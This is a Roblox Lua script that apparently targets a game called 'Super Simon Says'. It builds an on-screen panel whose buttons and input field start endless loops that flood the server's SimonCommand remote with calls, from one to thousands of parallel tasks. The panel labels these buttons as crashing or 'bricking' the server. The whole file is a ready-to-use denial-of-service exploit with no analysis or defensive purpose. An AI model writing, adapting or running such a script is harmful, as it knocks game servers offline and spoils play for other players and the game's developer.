local player = game.Players.LocalPlayer
local guiEnabled = true

-- Create a ScreenGui
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "SimonCrasherGUI"
screenGui.Parent = game.CoreGui

-- Create the draggable frame
local frame = Instance.new("Frame")
frame.Name = "DraggableFrame"
frame.Size = UDim2.new(0, 200, 0, 290)
frame.Position = UDim2.new(0.5, -100, 0.5, -75)
frame.AnchorPoint = Vector2.new(0.5, 0.5)
frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
frame.BorderSizePixel = 0
frame.Active = true
frame.Draggable = true
frame.Visible = true
frame.Parent = screenGui

-- Create the title
local title = Instance.new("TextLabel")
title.Name = "Title"
title.Size = UDim2.new(1, 0, 0, 30)
title.Position = UDim2.new(0, 0, 0, 0)
title.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
title.BorderSizePixel = 0
title.Text = "Super Simon Says Server Crasher"
title.Font = Enum.Font.SourceSansBold
title.TextSize = 14
title.TextColor3 = Color3.fromRGB(255, 255, 255)
title.Parent = frame

-- Create the crash button
local crashButton = Instance.new("TextButton")
crashButton.Name = "CrashButton"
crashButton.Size = UDim2.new(0, 160, 0, 50)
crashButton.Position = UDim2.new(0.5, 0, 0, 40)
crashButton.AnchorPoint = Vector2.new(0.5, 0)
crashButton.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
crashButton.BorderSizePixel = 0
crashButton.Text = "Crash Server (Spam Click)"
crashButton.Font = Enum.Font.SourceSansBold
crashButton.TextSize = 14
crashButton.TextColor3 = Color3.fromRGB(255, 255, 255)
crashButton.Parent = frame
crashButton.MouseButton1Click:Connect(function()
    -- coroutine.resume(coroutine.Create(function()
    for i = 1, (math.huge ^ math.huge * math.huge ^ math.huge) * math.huge ^ math.huge, .1 do
        pcall(function()
            while true do
                game:GetService("ReplicatedStorage").ServerEvents.SimonCommand:InvokeServer(true, true, 1)
                task.wait(.00000000000000000000000000001)
                game:GetService("ReplicatedStorage").ServerEvents.SimonCommand:InvokeServer(true, true, 2)
                task.wait(.00000000000000000000000000001)
                game:GetService("ReplicatedStorage").ServerEvents.SimonCommand:InvokeServer(true, true, 3)
                task.wait(.00000000000000000000000000001)
                game:GetService("ReplicatedStorage").ServerEvents.SimonCommand:InvokeServer(true, true, 4)
                task.wait(.00000000000000000000000000001)
            end

        end)
    end
    -- end))

end)

-- Create the crash button
local masscrashButton = Instance.new("TextButton")
masscrashButton.Name = "CrasheButton"
masscrashButton.Size = UDim2.new(0, 160, 0, 50)
masscrashButton.Position = UDim2.new(0.5, 0, 0, 100)
masscrashButton.AnchorPoint = Vector2.new(0.5, 0)
masscrashButton.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
masscrashButton.BorderSizePixel = 0
masscrashButton.Text = "Brick Server (Use with caution)"
masscrashButton.Font = Enum.Font.SourceSansBold
masscrashButton.TextSize = 14
masscrashButton.TextColor3 = Color3.fromRGB(255, 255, 255)
masscrashButton.Parent = frame
masscrashButton.MouseButton1Click:Connect(function()
    for i = 1, 1000 do
        task.spawn(function()
            for i = 1, (math.huge ^ math.huge * math.huge ^ math.huge) * math.huge ^ math.huge, .1 do
                pcall(function()
                    while true do
                        game:GetService("ReplicatedStorage").ServerEvents.SimonCommand:InvokeServer(true, true, 1)
                        task.wait(.00000000000000000000000000001)
                        game:GetService("ReplicatedStorage").ServerEvents.SimonCommand:InvokeServer(true, true, 2)
                        task.wait(.00000000000000000000000000001)
                        game:GetService("ReplicatedStorage").ServerEvents.SimonCommand:InvokeServer(true, true, 3)
                        task.wait(.00000000000000000000000000001)
                        game:GetService("ReplicatedStorage").ServerEvents.SimonCommand:InvokeServer(true, true, 4)
                        task.wait(.00000000000000000000000000001)
                    end

                end)
            end
        end)
        warn("Started " .. i .. "Tasks!")
    end
end)

local masstcrashButton = Instance.new("TextButton")
masstcrashButton.Name = "CrashdeButton"
masstcrashButton.Size = UDim2.new(0, 160, 0, 50)
masstcrashButton.Position = UDim2.new(0.5, 0, 0, 170)
masstcrashButton.AnchorPoint = Vector2.new(0.5, 0)
masstcrashButton.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
masstcrashButton.BorderSizePixel = 0
masstcrashButton.Text = "Crash the game and client \n(Your chats will be delayed\nYou will need to rejoin after use)"
masstcrashButton.Font = Enum.Font.SourceSansBold
masstcrashButton.TextSize = 14
masstcrashButton.TextColor3 = Color3.fromRGB(255, 255, 255)
masstcrashButton.Parent = frame
masstcrashButton.MouseButton1Click:Connect(function()
    for i = 1, 10000 do
        task.spawn(function()
            for i = 1, (math.huge ^ math.huge * math.huge ^ math.huge) * math.huge ^ math.huge, .1 do
                pcall(function()
                    while true do
                        game:GetService("ReplicatedStorage").ServerEvents.SimonCommand:InvokeServer(true, true, 1)
                        task.wait(.00000000000000000000000000001)
                        game:GetService("ReplicatedStorage").ServerEvents.SimonCommand:InvokeServer(true, true, 2)
                        task.wait(.00000000000000000000000000001)
                        game:GetService("ReplicatedStorage").ServerEvents.SimonCommand:InvokeServer(true, true, 3)
                        task.wait(.00000000000000000000000000001)
                        game:GetService("ReplicatedStorage").ServerEvents.SimonCommand:InvokeServer(true, true, 4)
                        task.wait(.00000000000000000000000000001)
                    end

                end)
            end
        end)
        warn("Started " .. i .. "Tasks!")
    end
end)

local inputField = Instance.new("TextBox")
inputField.Name = "InputField"
inputField.Size = UDim2.new(0, 160, 0, 30)
inputField.Position = UDim2.new(0.5, 0, 0, 240)
inputField.AnchorPoint = Vector2.new(0.5, 0)
inputField.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
inputField.BorderSizePixel = 0
inputField.PlaceholderText = "Manual input"
inputField.Font = Enum.Font.SourceSansBold
inputField.TextSize = 14
inputField.TextColor3 = Color3.fromRGB(0, 0, 0)
inputField.Parent = frame
inputField.FocusLost:Connect(function(enterPressed)
    if enterPressed then
        local inputText = tonumber(inputField.Text)
        if inputText and inputText > 0 then
            for i = 1, inputText do
                task.spawn(function()
                    for i = 1, (math.huge ^ math.huge * math.huge ^ math.huge) * math.huge ^ math.huge, .1 do
                        pcall(function()
                            while true do
                                game:GetService("ReplicatedStorage").ServerEvents.SimonCommand:InvokeServer(true, true,
                                    1)
                                task.wait(.00000000000000000000000000001)
                                game:GetService("ReplicatedStorage").ServerEvents.SimonCommand:InvokeServer(true, true,
                                    2)
                                task.wait(.00000000000000000000000000001)
                                game:GetService("ReplicatedStorage").ServerEvents.SimonCommand:InvokeServer(true, true,
                                    3)
                                task.wait(.00000000000000000000000000001)
                                game:GetService("ReplicatedStorage").ServerEvents.SimonCommand:InvokeServer(true, true,
                                    4)
                                task.wait(.00000000000000000000000000001)
                            end

                        end)
                    end
                end)
                warn("Started " .. i .. "Tasks!")
            end
        else
            warn("Please enter a valid number of tasks.")
        end
    end
end)
